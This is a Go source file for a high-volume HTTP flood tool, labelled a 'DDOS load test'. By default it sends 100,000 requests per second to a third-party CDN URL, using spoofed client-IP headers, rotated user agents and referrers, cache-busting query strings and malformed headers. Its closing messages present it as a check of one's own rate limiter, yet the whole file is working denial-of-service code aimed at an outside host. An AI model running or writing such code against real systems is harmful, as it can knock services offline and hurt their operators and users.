package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Stats struct {
	totalRequests   atomic.Int64
	successRequests atomic.Int64
	failedRequests  atomic.Int64
	blockedRequests atomic.Int64
	timeouts        atomic.Int64
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
	"curl/7.68.0",
	"Wget/1.20.3 (linux-gnu)",
	"python-requests/2.25.1",
	"PostmanRuntime/7.28.4",
	"Apache-HttpClient/4.5.13 (Java/11.0.11)",
	"Go-http-client/1.1",
	"fasthttp",
	"axios/0.21.1",
	"node-fetch/1.0.0",
}

var referrers = []string{
	"https://www.google.com/search?q=test",
	"https://www.facebook.com/",
	"https://www.reddit.com/r/programming",
	"https://twitter.com/",
	"https://www.youtube.com/",
	"https://github.com/",
	"https://stackoverflow.com/",
	"https://news.ycombinator.com/",
	"",
	"https://attacker.com",
	"https://bot.network",
}

var methods = []string{"GET", "HEAD", "OPTIONS"}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func randomChoice(slice []string) string {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(slice))))
	return slice[n.Int64()]
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func main() {
	rps := flag.Int("rps", 100000, "Requests per second")
	duration := flag.Int("duration", 10, "Test duration in seconds")
	workers := flag.Int("workers", 2000, "Number of concurrent workers")
	url := flag.String("url", "http://seektables.scdn.co/seektable/8965ccf7ca0bfa6017c728343c89a1c7fdf9493c.json", "Target URL")
	randomUA := flag.Bool("random-ua", true, "Use random User-Agent headers")
	randomParams := flag.Bool("random-params", true, "Add random query parameters")
	randomHeaders := flag.Bool("random-headers", true, "Add random headers")
	randomMethods := flag.Bool("random-methods", true, "Use random HTTP methods")
	malformedRequests := flag.Bool("malformed", true, "Send malformed requests")
	httpFlood := flag.Bool("http-flood", true, "HTTP flood attack mode")
	bypassCache := flag.Bool("bypass-cache", true, "Aggressive cache bypass")
	flag.Parse()

	fmt.Printf("🔥 ADVANCED DDOS LOAD TEST 🔥\n")
	fmt.Printf("  Target URL: %s\n", *url)
	fmt.Printf("  Target RPS: %d\n", *rps)
	fmt.Printf("  Duration: %d seconds\n", *duration)
	fmt.Printf("  Workers: %d\n", *workers)
	fmt.Printf("  Random User-Agents: %v\n", *randomUA)
	fmt.Printf("  Random Parameters: %v\n", *randomParams)
	fmt.Printf("  Random Headers: %v\n", *randomHeaders)
	fmt.Printf("  Random Methods: %v\n", *randomMethods)
	fmt.Printf("  Malformed Requests: %v\n", *malformedRequests)
	fmt.Printf("  HTTP Flood: %v\n", *httpFlood)
	fmt.Printf("  Cache Bypass: %v\n", *bypassCache)
	fmt.Printf("  Expected Total: %d\n\n", *rps**duration)

	stats := &Stats{}
	
	// Create aggressive transport settings
	transport := &http.Transport{
		MaxIdleConns:          0,
		MaxIdleConnsPerHost:   0,
		MaxConnsPerHost:       0, // Unlimited connections
		IdleConnTimeout:       1 * time.Second,
		DisableKeepAlives:     true, // Force new connections
		DisableCompression:    false,
		TLSHandshakeTimeout:   2 * time.Second,
		ResponseHeaderTimeout: 3 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   2 * time.Second,
			KeepAlive: -1, // Disable keep-alive
		}).DialContext,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	done := make(chan bool)
	
	var wg sync.WaitGroup
	
	// Calculate requests per worker
	requestsPerWorker := (*rps * *duration) / *workers
	if requestsPerWorker == 0 {
		requestsPerWorker = 1
	}

	fmt.Println("🚀 Launching attack workers...")
	
	// Start workers
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go aggressiveWorker(
			client,
			*url,
			requestsPerWorker,
			stats,
			&wg,
			done,
			*randomUA,
			*randomParams,
			*randomHeaders,
			*randomMethods,
			*malformedRequests,
			*httpFlood,
			*bypassCache,
		)
	}

	// Stats reporter
	go reportStats(stats, *duration, done)

	startTime := time.Now()
	
	// Run for duration
	time.Sleep(time.Duration(*duration) * time.Second)
	close(done)

	// Wait for workers
	wg.Wait()

	elapsed := time.Since(startTime)
	printFinalStats(stats, elapsed)
}

func aggressiveWorker(
	client *http.Client,
	baseURL string,
	requestCount int,
	stats *Stats,
	wg *sync.WaitGroup,
	done chan bool,
	randomUA, randomParams, randomHeaders, randomMethods, malformed, httpFlood, bypassCache bool,
) {
	defer wg.Done()

	for i := 0; i < requestCount; i++ {
		select {
		case <-done:
			return
		default:
		}

		stats.totalRequests.Add(1)

		// Build URL with aggressive cache busting
		url := baseURL
		if randomParams || bypassCache {
			cacheBuster := fmt.Sprintf("?_=%d&cb=%s&rand=%s&t=%d&v=%s",
				time.Now().UnixNano(),
				randomString(12),
				randomString(8),
				time.Now().Unix(),
				randomString(6),
			)
			url = baseURL + cacheBuster
		}

		// Choose HTTP method
		method := "GET"
		if randomMethods {
			method = randomChoice(methods)
		}

		req, err := http.NewRequest(method, url, nil)
		if err != nil {
			stats.failedRequests.Add(1)
			continue
		}

		// Aggressive User-Agent rotation
		if randomUA {
			req.Header.Set("User-Agent", randomChoice(userAgents))
		}

		// Add realistic and spoofed headers
		if randomHeaders {
			// Spoofed IP headers
			fakeIP := fmt.Sprintf("%d.%d.%d.%d",
				randInt(1, 254), randInt(1, 254), randInt(1, 254), randInt(1, 254))
			req.Header.Set("X-Forwarded-For", fakeIP)
			req.Header.Set("X-Real-IP", fakeIP)
			req.Header.Set("X-Originating-IP", fakeIP)
			req.Header.Set("X-Client-IP", fakeIP)
			req.Header.Set("CF-Connecting-IP", fakeIP)
			req.Header.Set("True-Client-IP", fakeIP)
			
			// Referrer spoofing
			req.Header.Set("Referer", randomChoice(referrers))
			
			// Standard headers with variations
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Language", randomChoice([]string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}))
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Connection", "close")
			
			// Cache control variations
			cacheControls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
			req.Header.Set("Cache-Control", randomChoice(cacheControls))
			req.Header.Set("Pragma", "no-cache")
			
			// Random custom headers
			req.Header.Set("X-Requested-With", randomChoice([]string{"XMLHttpRequest", "fetch", "axios"}))
			req.Header.Set("X-Session-ID", randomString(32))
			req.Header.Set("X-Request-ID", randomString(16))
		}

		// Malformed request headers
		if malformed && randInt(1, 10) > 7 {
			// Add potentially problematic headers
			req.Header.Set("Content-Length", fmt.Sprintf("%d", randInt(0, 999999)))
			req.Header.Set("Range", "bytes=0-")
			req.Header.Set("If-None-Match", randomString(24))
			req.Header.Set("If-Modified-Since", time.Now().Add(-time.Hour*24).Format(http.TimeFormat))
		}

		// HTTP flood: send request without reading full response
		if httpFlood {
			resp, err := client.Do(req)
			if err != nil {
				if strings.Contains(err.Error(), "timeout") {
					stats.timeouts.Add(1)
				}
				stats.failedRequests.Add(1)
				continue
			}

			// Just check status, don't read body
			switch resp.StatusCode {
			case http.StatusOK:
				stats.successRequests.Add(1)
			case http.StatusTooManyRequests, 503:
				stats.blockedRequests.Add(1)
			default:
				stats.failedRequests.Add(1)
			}

			// Close immediately without reading
			resp.Body.Close()
		} else {
			resp, err := client.Do(req)
			if err != nil {
				if strings.Contains(err.Error(), "timeout") {
					stats.timeouts.Add(1)
				}
				stats.failedRequests.Add(1)
				continue
			}

			// Read and discard body
			io.Copy(io.Discard, resp.Body)

			switch resp.StatusCode {
			case http.StatusOK:
				stats.successRequests.Add(1)
			case http.StatusTooManyRequests, 503:
				stats.blockedRequests.Add(1)
			default:
				stats.failedRequests.Add(1)
			}

			resp.Body.Close()
		}

		// Small delay to avoid completely overwhelming local system
		if !httpFlood && randInt(1, 100) > 95 {
			time.Sleep(time.Microsecond * 100)
		}
	}
}

func reportStats(stats *Stats, duration int, done chan bool) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	lastTotal := int64(0)
	startTime := time.Now()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			elapsed := int(time.Since(startTime).Seconds())
			if elapsed > duration {
				return
			}

			currentTotal := stats.totalRequests.Load()
			currentRPS := currentTotal - lastTotal
			lastTotal = currentTotal

			fmt.Printf("[%02ds] Req: %d | RPS: %d | ✓ %d | ✗ %d | 🚫 %d | ⏱ %d\n",
				elapsed,
				currentTotal,
				currentRPS,
				stats.successRequests.Load(),
				stats.failedRequests.Load(),
				stats.blockedRequests.Load(),
				stats.timeouts.Load(),
			)
		}
	}
}

func printFinalStats(stats *Stats, elapsed time.Duration) {
	total := stats.totalRequests.Load()
	success := stats.successRequests.Load()
	blocked := stats.blockedRequests.Load()
	failed := stats.failedRequests.Load()
	timeouts := stats.timeouts.Load()
	actualRPS := float64(total) / elapsed.Seconds()

	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("💥 FINAL ATTACK RESULTS 💥")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Printf("Total Duration: %.2f seconds\n", elapsed.Seconds())
	fmt.Printf("Total Requests: %d\n", total)
	fmt.Printf("Actual RPS: %.0f\n", actualRPS)
	fmt.Printf("\nBreakdown:\n")
	fmt.Printf("  ✓ Success (200):       %8d (%.1f%%)\n", success, float64(success)/float64(total)*100)
	fmt.Printf("  🚫 Blocked (429/503):  %8d (%.1f%%)\n", blocked, float64(blocked)/float64(total)*100)
	fmt.Printf("  ✗ Failed (errors):     %8d (%.1f%%)\n", failed, float64(failed)/float64(total)*100)
	fmt.Printf("  ⏱ Timeouts:            %8d (%.1f%%)\n", timeouts, float64(timeouts)/float64(total)*100)
	fmt.Println(strings.Repeat("=", 70))
	
	if float64(blocked)/float64(total) > 0.5 {
		fmt.Println("✅ Your rate limiter is blocking > 50% of requests - Good job!")
	} else if float64(blocked)/float64(total) > 0.1 {
		fmt.Println("⚠️  Your rate limiter is blocking some requests, but might need tuning")
	} else {
		fmt.Println("❌ Your rate limiter might not be working - very few blocks detected")
	}
}
